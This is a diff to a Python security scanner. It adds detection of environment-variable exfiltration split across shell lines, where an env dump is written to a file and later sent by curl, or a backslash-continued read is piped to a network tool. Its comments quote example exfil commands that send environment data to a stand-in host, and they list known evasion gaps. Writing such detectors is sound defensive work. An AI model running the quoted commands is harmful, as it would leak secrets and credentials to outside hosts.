@@ -767,6 +767,120 @@ def _shell_line_is_env_read_to_net_sink(line: str) -> bool:
     return not _line_has_loopback_or_private_ip_shell(line)
 
 
+# TRDD-GYK6S60T: the carve-out above is single-line, so the SAME exfil split over
+# lines stayed blanket-suppressed in a test-path shell file:
+#   env > /tmp/e            ...   cat /tmp/e | curl -d @- https://x.example
+#   printenv \   (newline)  | curl -d @- https://x.example
+# Two cross-line shapes are tracked: (1) a backslash-continued logical line that
+# joins an env/argv read to a network sink, (2) a file written by a full-environment
+# dump redirect (`env|printenv|set|export -p|declare -x` with `>`/`>>` to a path or
+# `$VAR`) and read by a LATER non-loopback network client (`@f`, `<f`, `-T f`,
+# `--upload-file f`, `--post-file f`, `cat f |`). Same literal path or same
+# `$VAR` / `${VAR}` name; loopback / private destinations stay exempt as above.
+# Known limits (lexical, fails toward clearing): only a literal path or the same
+# `$VAR` name is matched; `cp`/`mv` of the dump, a renamed variable and `tee` are not followed.
+_ENV_DUMP_REDIRECT_RE: Final[re.Pattern[str]] = re.compile(
+    r"(?:^|[\s;&|(`])(?:env|printenv|set|export\s+-p|declare\s+-x)(?:\s+-0)?\s*>>?\s*(?P<target>\"[^\"]+\"|'[^']+'|[^\s;&|)`]+)",
+)
+
+
+def _norm_dump_target(raw: str) -> str:
+    """Strip quotes and `${VAR}` braces so `"$F"`, `$F` and `${F}` compare equal."""
+    target = raw.strip("\"'")
+    return re.sub(r"\$\{(\w+)\}", r"$\1", target)
+
+
+def _logical_shell_line(lines: list[str], line_idx: int) -> tuple[str, int]:
+    """Join ``lines[line_idx]`` with its backslash-continuation neighbours.
+
+    Returns the joined text (each trailing ``\\`` replaced by a space) and the
+    index of the FIRST physical line of the logical line."""
+    start = line_idx
+    while start > 0 and lines[start - 1].rstrip().endswith("\\"):
+        start -= 1
+    end = line_idx
+    while end < len(lines) - 1 and lines[end].rstrip().endswith("\\"):
+        end += 1
+    parts = [ln.rstrip()[:-1] if ln.rstrip().endswith("\\") else ln for ln in lines[start : end + 1]]
+    return " ".join(parts), start
+
+
+def _is_non_loopback_net_send(logical: str) -> bool:
+    """True iff the logical line runs a network client / pipes into a network sink, not loopback-only."""
+    if not (_line_has_exfil_sink(logical) or _SHELL_NET_TOOL_RE.search(logical)):
+        return False
+    return not _line_has_loopback_or_private_ip_shell(logical)
+
+
+def _dump_read_regex(target: str) -> re.Pattern[str]:
+    """Regex for a network-client argument that READS the dump file `target` (literal path or `$VAR`)."""
+    var = re.fullmatch(r"\$(\w+)", target)
+    ref = rf"\$(?:\{{{re.escape(var.group(1))}\}}|{re.escape(var.group(1))}\b)" if var else re.escape(target)
+    return re.compile(rf"(?:@|<\s*|-T\s*|--upload-file[=\s]+|--post-file[=\s]+|\bcat\s+)[\"']?{ref}(?![\w/.-])")
+
+
+# (dump line index, read regex) for every full-environment dump redirect, and
+# (first physical line index, joined text) for every non-loopback network send.
+_SplitExfilIndex = tuple[list[tuple[int, re.Pattern[str]]], list[tuple[int, str]]]
+
+
+def _build_split_exfil_index(lines: list[str]) -> _SplitExfilIndex:
+    """One pass over the file: its env-dump redirects and, only when there is one, its network sends.
+
+    TRDD-U0UYW3OD: classify() asks about every finding line of a file; scanning all earlier lines and
+    compiling a regex per dump on each ask was quadratic in the number of findings."""
+    dumps: list[tuple[int, re.Pattern[str]]] = []
+    for idx, line in enumerate(lines):
+        if line.lstrip().startswith("#"):
+            continue
+        for dump in _ENV_DUMP_REDIRECT_RE.finditer(line):
+            target = _norm_dump_target(dump.group("target"))
+            if target and not target.startswith("/dev/"):
+                dumps.append((idx, _dump_read_regex(target)))
+    sends: list[tuple[int, str]] = []
+    if dumps:
+        for idx, line in enumerate(lines):
+            if line.lstrip().startswith("#") or (idx > 0 and lines[idx - 1].rstrip().endswith("\\")):
+                continue  # a comment, or the middle of a continuation chain already joined from its first line
+            logical, _first = _logical_shell_line(lines, idx)
+            if _is_non_loopback_net_send(logical):
+                sends.append((idx, logical))
+    return dumps, sends
+
+
+# One entry: classify() runs per finding on the SAME content string, so the index is built once per file.
+_SPLIT_EXFIL_INDEX_CACHE: dict[str, _SplitExfilIndex] = {}
+
+
+def _split_exfil_index(content: str, lines: list[str]) -> _SplitExfilIndex:
+    """The `_build_split_exfil_index` result for `content`, memoised for the file being classified."""
+    index = _SPLIT_EXFIL_INDEX_CACHE.get(content)
+    if index is None:
+        index = _build_split_exfil_index(lines)
+        _SPLIT_EXFIL_INDEX_CACHE.clear()
+        _SPLIT_EXFIL_INDEX_CACHE[content] = index
+    return index
+
+
+def _shell_split_env_read_to_net_sink(lines: list[str], line_idx: int, index: _SplitExfilIndex) -> bool:
+    """True iff the finding at ``line_idx`` is one half of a split env exfil that stays visible:
+    the network SEND (carries an env/argv read itself across a ``\\`` continuation, or reads a file an
+    EARLIER line filled with a full-environment dump), or the DUMP line itself when a LATER non-loopback
+    network send reads the dumped file (same read regex, same loopback exemption)."""
+    dumps, sends = index
+    logical, first = _logical_shell_line(lines, line_idx)
+    if _is_non_loopback_net_send(logical):
+        if _ENV_ARGV_READ_RE.search(logical):
+            return True
+        if any(dump_idx < first and read_re.search(logical) for dump_idx, read_re in dumps):
+            return True
+    # Reverse direction: the dump line is the one flagged (ENV_RECON dump-redirect pattern).
+    return any(
+        dump_idx == line_idx and any(send_idx > dump_idx and read_re.search(text) for send_idx, text in sends)
+        for dump_idx, read_re in dumps
+    )
+
+
 # A command substitution whose pipeline STARTS with a full-environment dump
 # (bare `env` / `printenv` with no variable name, `export -p`, `declare -x`,
 # `cat /proc/self/environ`). `printenv HOME` (one named variable) is not a dump.
@@ -1743,6 +1857,14 @@ def classify(
             pass  # decode→exec in a test file → keep visible
         elif _shell_line_is_env_read_to_net_sink(line_text):
             pass  # env/argv read piped/passed to a network tool → keep visible
+        elif rule_id in ("ENV_RECON", "CMD_INJECTION") and _shell_split_env_read_to_net_sink(
+            lines, line_idx, _split_exfil_index(content, lines)
+        ):
+            # TRDD-GYK6S60T: split read-and-send (env dumped to a file read by a later
+            # network client, or a `\`-continued env/argv read) was suppressed by path alone.
+            # TRDD-U0UYW3OD: the DUMP line is flagged too (dump-redirect catalog pattern), so it
+            # stays visible when a later non-loopback send reads the dumped file.
+            pass
         else:
             return "safe_literal"
 
